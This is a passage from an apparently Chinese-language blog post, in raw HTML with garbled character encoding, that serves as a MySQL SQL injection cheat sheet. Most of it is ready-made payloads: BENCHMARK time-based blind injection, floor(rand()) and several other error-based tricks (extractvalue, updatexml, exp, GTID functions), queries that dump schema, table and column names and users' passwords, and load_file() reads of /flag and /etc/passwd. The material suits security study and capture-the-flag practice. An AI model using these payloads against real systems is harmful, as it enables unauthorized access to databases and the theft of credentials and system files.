class="number">-9.</span>ä¸­æ‰¾ç‰ˆæœ¬å·ç¬¬ä¸€ä½</span><br></pre></td></tr></table></figure></div><blockquote><p>sleepå‡½æ•°å»¶æ—¶ä¸å¸¸ç”¨ï¼Œæ—¶é—´å¯èƒ½å› ç½‘é€Ÿå½±å“</p></blockquote><p>åˆ©ç”¨BENCHMARK()è¿›è¡Œå»¶æ—¶æ³¨å…¥ </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> (IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="keyword">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1<span class="comment">--+</span></span><br><span class="line"># å½“ç»“æœæ­£ç¡®çš„æ—¶å€™ï¼Œè¿è¡ŒENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)æ“ä½œ<span class="number">50000000</span> æ¬¡ï¼Œä¼šå ç”¨ä¸€æ®µæ—¶é—´ã€‚</span><br></pre></td></tr></table></figure></div><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h3 id="æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™"><a href="#æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™" class="headerlink" title="æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™"></a>æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™</h3><p><u>é€‚ç”¨äºä½ç‰ˆæœ¬ï¼Œmysql8ä¼¼ä¹è¢«ä¿®å¤</u></p><p>flooræŠ¥é”™æ³¨å…¥æ˜¯åˆ©ç”¨ <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>è¿™ä¸ªç›¸å¯¹å›ºå®šçš„è¯­å¥æ ¼å¼ï¼Œå¯¼è‡´çš„æ•°æ®åº“æŠ¥é”™</p><h4 id="å‡½æ•°è¯´æ˜"><a href="#å‡½æ•°è¯´æ˜" class="headerlink" title="å‡½æ•°è¯´æ˜"></a>å‡½æ•°è¯´æ˜</h4><ul><li>rand() æ˜¯ä¸€ä¸ªéšæœºå‡½æ•°(äº§ç”Ÿ0åˆ°1é—´éšæœºæµ®ç‚¹æ•°),ç›´æ¥ä½¿ç”¨æ¯æ¬¡äº§ç”Ÿçš„æ•°éƒ½ä¸åŒï¼Œä½†æ˜¯å½“æä¾›äº†ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼šè¿™æ ·æ¯æ¬¡äº§ç”Ÿçš„å€¼éƒ½æ˜¯ä¸€æ ·çš„ã€‚</li><li>floor(rand(0)*2ï¼‰ floor()æ˜¯å‘ä¸‹å–æ•´ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°åªå«0 1çš„ä¼ªéšæœºåºåˆ—</li></ul><h4 id="æŠ¥é”™åŸå› "><a href="#æŠ¥é”™åŸå› " class="headerlink" title="æŠ¥é”™åŸå› "></a>æŠ¥é”™åŸå› </h4><p>å½“æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶ä¼šæŠ¥é”™(ä¸»é”®å†²çª)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¸»è¦åˆ©ç”¨floor(rand(0)*2)çš„ç»“æœè§„å¾‹ä¸º0 1 1 0 1 1ï¼Œå½“æ•°æ®è¡¨ä¸­æœ€å°‘éœ€è¦ä¸‰æ¡æ•°æ®æ‰ä¼šæŠ¥é”™</p><p>floor()æŠ¥é”™æ³¨å…¥çš„åŸå› æ˜¯group byåœ¨å‘ä¸´æ—¶è¡¨æ’å…¥æ•°æ®æ—¶ï¼Œç”±äºrand()å¤šæ¬¡è®¡ç®—å¯¼è‡´æ’å…¥ä¸´æ—¶è¡¨æ—¶ä¸»é”®é‡å¤ï¼Œä»è€ŒæŠ¥é”™ï¼Œåˆå› ä¸ºæŠ¥é”™å‰concat()ä¸­çš„SQLè¯­å¥æˆ–å‡½æ•°è¢«æ‰§è¡Œï¼Œæ‰€ä»¥è¯¥è¯­å¥æŠ¥é”™ä¸”è¢«æŠ›å‡ºçš„ä¸»é”®æ˜¯SQLè¯­å¥æˆ–å‡½æ•°æ‰§è¡Œåçš„ç»“æœã€‚</p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">#ä¹Ÿå¯ä»¥ç®€åŒ–æˆ</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line">#å…³é”®è¡¨è¢«è¿‡æ»¤æ—¶</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">#randè¢«è¿‡æ»¤ é€‚ç”¨ç”¨æˆ·å˜é‡</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> ( <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.hackblog.cn<span class="operator">/</span>sql.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span></span><br><span class="line">concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line">çˆ†è¡¨</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">çˆ†å­—æ®µ</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>â€˜usersâ€™ limit <span class="number">0</span>,<span class="number">1</span>),â€™<span class="operator">|</span>â€™,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">çˆ†æ•°æ®</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> concat(name,â€™<span class="operator">|</span>â€™,passwd,â€™<span class="operator">|</span>â€™,birth) <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),â€™<span class="operator">|</span>â€™,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> concat(<span class="number">0x23</span>,name,<span class="number">0x3a</span>,passwd,<span class="number">0x23</span>) <span class="keyword">FROM</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure></div><p>å‡ ä½•å‡½æ•° </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollectionï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">polygon()ï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipoint()ï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multilinestring()ï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">linestring()ï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipolygon() ï¼šid<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure></div><p>ä¸å­˜åœ¨å‡½æ•°</p><blockquote><p>çˆ†æ•°æ®åº“</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032231655.jpg"                      alt="image-20220708181105742"                ><figcaption>image-20220708181105742</figcaption></figure></p></blockquote><p>name_const()</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è·å–ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">0x1</span>),name_const(version(),<span class="number">0x1</span>))a;</span><br><span class="line"># <span class="number">1060</span> <span class="operator">-</span> Duplicate <span class="keyword">column</span> name <span class="string">&#x27;8.0.27&#x27;</span></span><br></pre></td></tr></table></figure></div><p>uuidç›¸å…³å‡½æ•°</p><p>mysql:8.0.x</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UUID_TO_BIN((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>));</span><br><span class="line"># <span class="number">1146</span> <span class="operator">-</span> <span class="keyword">Table</span> <span class="string">&#x27;test.users&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span></span><br><span class="line"><span class="string"># 1146 - Table &#x27;</span>test.users<span class="string">&#x27; doesn&#x27;</span>t exist</span><br></pre></td></tr></table></figure></div><p>exp() é€‚ç”¨ç‰ˆæœ¬ 5.5.5-5.5.49</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span>())a));</span><br><span class="line"><span class="comment">--å…¶ä¸­ï¼Œ~ç¬¦å·ä¸ºè¿ç®—ç¬¦ï¼Œæ„æ€ä¸ºä¸€å…ƒå­—ç¬¦åè½¬ï¼Œé€šå¸¸å°†å­—ç¬¦ä¸²ç»è¿‡å¤„ç†åå˜æˆå¤§æ•´æ•°ï¼Œå†æ”¾åˆ°expå‡½ æ•°å†…ï¼Œå¾—åˆ°çš„ç»“æœå°†è¶…è¿‡mysqlçš„doubleæ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºã€‚é™¤äº†exp()ä¹‹å¤–ï¼Œè¿˜æœ‰ç±»ä¼¼pow()ä¹‹ç±»çš„ç›¸ä¼¼å‡½æ•°åŒæ ·æ˜¯å¯åˆ©ç”¨çš„ï¼Œä»–ä»¬çš„åŸç†ç›¸åŒã€‚</span></span><br><span class="line"><span class="comment">--double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´</span></span><br><span class="line"><span class="comment">--Exp()ä¸ºä»¥e ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span></span><br><span class="line"></span><br><span class="line">å¦‚æœæ˜¯åœ¨é€‚ç”¨ç‰ˆæœ¬ä¹‹å¤–ï¼šè™½ç„¶ä¹Ÿä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¡¨åä¸ä¼šå‡ºæ¥</span><br><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)<span class="operator">-</span><span class="operator">~</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>expæŠ¥é”™<a class="link"   href="https://www.cnblogs.com/lcamry/articles/5509124.html" >ï¼ˆè½¬è½½ï¼‰ä½¿ç”¨expè¿›è¡ŒSQLæŠ¥é”™æ³¨å…¥ - lcamry - åšå®¢å›­ (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>pow()ç»“åˆç›²æ³¨</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pow(<span class="number">1</span><span class="operator">+</span>(è¡¨è¾¾å¼),<span class="number">999999999999</span>)</span><br><span class="line"># è¡¨è¾¾å¼å¯ä»¥æ˜¯ç›²æ³¨çš„å½¢å¼ï¼Œè¿”å›<span class="number">1</span>æˆ–è€…<span class="number">0</span>ï¼Œé€šè¿‡æŠ¥é”™å°†å­—ç¬¦çŒœå‡ºæ¥ï¼ŒæŠ¥é”™å›æ˜¾çš„è¡¨è¾¾å¼æ˜¯è¿”å›<span class="number">1</span>çš„</span><br><span class="line"># åŒæ ·æ–¹å¼ç”¨åœ¨expä¸Š(ä¸´ç•Œå€¼ä¸º<span class="number">709</span>)</span><br><span class="line"><span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span>(è¡¨è¾¾å¼))</span><br></pre></td></tr></table></figure></div><p>bigint æº¢å‡ºæ–‡ç« <a class="link"   href="http://www.cnblogs.com/lcamry/articles/5509112.html" >http://www.cnblogs.com/lcamry/articles/5509112.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) <span class="operator">-</span> <span class="operator">~</span><span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><h3 id="xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨"><a href="#xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨" class="headerlink" title="xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨"></a>xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨</h3><p>æŠ¥é”™åŸå› ï¼Œ0x7eå°±æ˜¯~ä¸å±äºxpathè¯­æ³•æ ¼å¼</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>));</span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"># é€‚ç”¨ç‰ˆæœ¬: <span class="number">5.1</span><span class="number">.5</span><span class="operator">+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>updatexmlä¸‰ä¸ªå‚æ•°</p><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸º Doc 1</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpath æ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£ Xpath è¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒString æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®**</p></li></ul><p>æ³¨æ„åŠ selecté˜²æ­¢ä¸å›æ˜¾ï¼Œå½“æ˜¾ç¤ºå­—ç¬¦æœ‰é™æ—¶ï¼Œå¸¸ç”¨å­—ç¬¦ä¸²æˆªæ–­substré…åˆ</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))x;</span><br><span class="line"><span class="comment">--mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº†versionï¼Œæ‰€ä»¥æŠ¥é”™ã€‚</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Join-using-æ³¨åˆ—å"><a href="#Join-using-æ³¨åˆ—å" class="headerlink" title="Join using()æ³¨åˆ—å"></a>Join using()æ³¨åˆ—å</h3><p>mysql8ä¿®å¤</p><p>æŠ¥é”™å­˜åœ¨é‡å¤çš„åˆ—å</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b)c; # æŠ¥é”™ä¿¡æ¯å†…å›æ˜¾ç¬¬ä¸€åˆ—åç§°</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username))c;# ç¬¬äºŒåˆ—</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username,password))c;# ç¬¬ä¸‰åˆ—</span><br></pre></td></tr></table></figure></div><h3 id="GTIDç›¸å…³å‡½æ•°"><a href="#GTIDç›¸å…³å‡½æ•°" class="headerlink" title="GTIDç›¸å…³å‡½æ•°"></a>GTIDç›¸å…³å‡½æ•°</h3><p>ç‰ˆæœ¬&gt;&#x3D;5.6.5</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(<span class="keyword">user</span>(),<span class="number">1</span>); # æŠ¥é”™å›æ˜¾ç”¨æˆ·</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(hex(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subtract((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">1</span>); # æŠ¥é”™å›æ˜¾ç”¨æˆ·</span><br></pre></td></tr></table></figure></div><h2 id="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"><a href="#å¯¼å…¥å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"></a>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶</h2><h3 id="æŸ¥çœ‹é™åˆ¶"><a href="#æŸ¥çœ‹é™åˆ¶" class="headerlink" title="æŸ¥çœ‹é™åˆ¶"></a>æŸ¥çœ‹é™åˆ¶</h3><p>secure_file_priv</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232760.jpg"                      alt="image-20220708190755416"                ><figcaption>image-20220708190755416</figcaption></figure></p><h3 id="load-file-å¯¼å‡ºæ–‡ä»¶"><a href="#load-file-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="load_file()å¯¼å‡ºæ–‡ä»¶"></a>load_file()å¯¼å‡ºæ–‡ä»¶</h3><p>load_file(filename)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232156.jpg"                      alt="image-20220708190902690"                ><figcaption>image-20220708190902690</figcaption></figure></p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="keyword">using</span> utf8);</span><br></pre></td></tr></table></figure></div><p>è¯¦è§<a class="link"   href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQLæ³¨å…¥æ€»ç»“ â€“ cc (ccship.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><h3 id="å¸¸è§æ€è·¯-1"><a href="#å¸¸è§æ€è·¯-1" class="headerlink" 